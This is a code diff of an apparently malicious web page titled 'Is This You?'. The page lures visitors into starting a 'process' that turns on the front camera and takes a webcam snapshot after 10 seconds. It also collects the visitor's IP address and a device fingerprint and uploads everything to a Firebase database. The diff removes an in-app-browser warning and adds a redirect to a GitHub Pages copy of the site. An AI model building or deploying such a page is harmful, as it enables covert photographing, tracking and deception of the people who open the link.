@@ -49,7 +49,6 @@
             font-size: 18px;
             transition: background-color 0.3s;
             width: 100%;
-            display: none; /* Initially hidden */
         }
         .button:hover {
             background-color: #009900;
@@ -62,33 +61,6 @@
             color: #ffff00;
             margin: 10px 0;
         }
-        video {
-            width: 100%;
-            max-width: 480px; /* Limit max width for better visibility */
-            border: 2px solid green;
-            display: none; /* Hide initially until we get the stream */
-        }
-        /* Banner styles */
-        #banner {
-            display: none; /* Hidden by default */
-            background-color: #ffcc00;
-            padding: 15px;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            z-index: 1000;
-        }
-        .banner-message {
-            color: black;
-            font-weight: bold;
-        }
-        .close-banner {
-            float: right;
-            cursor: pointer;
-            font-weight: bold;
-            color: black;
-        }
     </style>
 </head>
 <body>
@@ -97,18 +69,13 @@
             <i class="fas fa-spinner fa-spin"></i> Sending data, please wait...
         </div>
     </div>
-    <div id="banner">
-        <span class="banner-message">Please open this link in Samsung Internet or Opera for the best experience.</span>
-        <span class="close-banner" id="close-banner">&times;</span>
-    </div>
     <div class="container">
         <h1>Is This You?</h1>
-        <p id="instruction"></p>
         <p>Data will be sent automatically.</p>
         <button class="button" id="start-button">Start Process</button>
         <div id="error-message" class="error-message"></div>
         <div id="info-message" class="info-message"></div>
-        <video id="video" autoplay playsinline></video>
+        <button class="button" id="redirect-button">Open in Browser</button>
     </div>
 
     <script type="module">
@@ -123,26 +90,6 @@
             measurementId: "G-HTXZEYZ3DK" // Your Measurement ID
         };
 
-        // Function to detect in-app browsers
-        function isInAppBrowser() {
-            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-            return /FBAN|FBAV|Instagram|Line|MicroMessenger|QQ|Kakao|WeChat/.test(userAgent);
-        }
-
-        // Show banner if in-app browser is detected
-        if (isInAppBrowser()) {
-            document.getElementById('banner').style.display = 'block'; // Show banner
-            document.getElementById('start-button').style.display = 'none'; // Hide button
-        } else {
-            document.getElementById('instruction').innerText = "You may proceed.";
-            document.getElementById('start-button').style.display = 'block'; // Show start button
-        }
-
-        // Close banner event
-        document.getElementById('close-banner').onclick = function() {
-            document.getElementById('banner').style.display = "none";
-        }
-
         // Initialize Firebase
         const { initializeApp } = await import("https://www.gstatic.com/firebasejs/9.14.0/firebase-app.js");
         const { getDatabase, ref, set } = await import("https://www.gstatic.com/firebasejs/9.14.0/firebase-database.js");
@@ -153,9 +100,9 @@
         const loadingScreen = document.getElementById('loading-screen');
         const errorMessage = document.getElementById('error-message');
         const infoMessage = document.getElementById('info-message');
-        const videoElement = document.getElementById('video');
 
         document.getElementById('start-button').addEventListener('click', startProcess);
+        document.getElementById('redirect-button').addEventListener('click', redirectToBrowser);
 
         async function startProcess() {
             errorMessage.innerHTML = ''; // Clear previous errors
@@ -163,21 +110,21 @@
             loadingScreen.style.display = 'flex'; // Show loading screen
             
             try {
-                // Get user's IP address
+                // Get user's IP address first
                 const ipAddress = await getIpAddress();
 
                 // Get device info
-                const deviceInfo = await getDeviceInfo();
+                const deviceInfo = await getDeviceInfo(ipAddress);
 
-                // Start the camera
-                const stream = await startCamera();
+                // Start camera for 10 seconds
+                const screenshot = await startCamera();
 
                 // Create a unique session ID
                 const sessionId = Date.now();
 
-                // Upload IP address, device info, and screenshot to Firebase
-                await uploadSessionData(sessionId, ipAddress, deviceInfo, stream);
-                
+                // Upload data to Firebase
+                await uploadSessionData(sessionId, screenshot, deviceInfo);
+
             } catch (error) {
                 errorMessage.innerHTML = error.message;
             } finally {
@@ -185,46 +132,40 @@
             }
         }
 
+        async function redirectToBrowser() {
+            // Redirect to the GitHub Pages URL
+            window.location.href = 'https://frankwesseling132.github.io/my-html-site/';
+        }
+
         async function startCamera() {
-            const constraints = {
-                video: {
-                    facingMode: 'user', // Use front camera
-                    width: { ideal: 1280 }, // Specify width
-                    height: { ideal: 720 } // Specify height
-                }
-            };
+            const video = document.createElement('video');
+            video.autoplay = true;
+            video.style.display = 'block'; // Make sure the video is visible
+            video.setAttribute('playsinline', true); // Important for iOS devices
 
             try {
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                videoElement.srcObject = stream; // Attach the video stream to the video element
-                videoElement.style.display = 'block'; // Show the video element
-
-                // Stop the camera after 10 seconds
-                setTimeout(() => {
-                    stopCamera(stream);
-                }, 10000); // Stop after 10 seconds
-
-                return stream;
+                // Access the camera
+                video.srcObject = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' } // Use the front camera
+                });
             } catch (error) {
                 throw new Error("Unable to access the camera.");
             }
-        }
 
-        function stopCamera(stream) {
-            stream.getTracks().forEach(track => track.stop());
-            videoElement.style.display = 'none'; // Hide video element after stopping
-        }
+            document.body.appendChild(video); // Append video to the body to access the stream
 
-        async function getDeviceInfo() {
-            return {
-                userAgent: navigator.userAgent,
-                deviceMemory: navigator.deviceMemory || 'N/A', // Device memory in GB
-                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A', // Number of logical processors
-                screenResolution: `${window.screen.width} x ${window.screen.height}`, // Screen resolution
-                language: navigator.language || 'en-US', // User language
-                platform: navigator.platform || 'N/A', // User platform
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone // User timezone
-            };
+            return new Promise((resolve) => {
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+                    video.srcObject.getTracks().forEach(track => track.stop()); // Stop the video stream
+                    document.body.removeChild(video); // Clean up the video element
+                    resolve(canvas.toDataURL('image/png')); // Return the screenshot as base64 string
+                }, 10000); // Capture after 10 seconds
+            });
         }
 
         async function getIpAddress() {
@@ -233,16 +174,28 @@
             return data.ip;
         }
 
-        async function uploadSessionData(sessionId, ipAddress, deviceInfo, stream) {
-            // Here you can take a screenshot from the video stream if needed
+        async function getDeviceInfo(ipAddress) {
+            return {
+                userAgent: navigator.userAgent,
+                deviceMemory: navigator.deviceMemory || 'N/A', // Device memory in GB
+                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A', // Number of logical processors
+                screenResolution: `${window.screen.width} x ${window.screen.height}`, // Screen resolution
+                language: navigator.language || 'en-US', // User language
+                platform: navigator.platform || 'N/A', // User platform
+                ipAddress: ipAddress, // User IP address
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone // User timezone
+            };
+        }
+
+        async function uploadSessionData(sessionId, screenshot, deviceInfo) {
             const sessionData = {
-                ipAddress: ipAddress,
                 timestamp: Date.now(),
+                screenshot: screenshot,
                 ...deviceInfo // Spread device info into session data
             };
             const dataRef = ref(database, 'sessions/' + sessionId);
             await set(dataRef, sessionData);
-            console.log('Session data uploaded successfully:', sessionData);
+            console.log('Session data uploaded successfully');
         }
     </script>
 </body>
